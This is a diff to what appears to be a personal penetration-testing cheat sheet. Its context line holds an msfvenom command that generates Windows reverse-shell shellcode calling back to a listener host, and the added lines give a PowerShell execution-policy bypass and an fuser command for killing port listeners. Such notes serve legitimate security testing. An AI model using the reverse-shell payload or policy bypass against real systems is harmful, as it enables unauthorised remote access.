@@ -36,5 +36,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=8443 -f python -b 
 REGULAR REVERSE SHELL SHELLCODE
 
 
+powershell -ep bypass 
+it's attempting to bypass the execution policy that might be in place, so you can more easily run things like ps1 scripts
 
 
+
+
+**FORCE TO KILL ANY PORT**
+For an 'all in one' linux command, check out [fuser](https://linux.die.net/man/1/fuser). `fuser -k 8080/tcp 8080/udp` should kill anything listening on 8080.
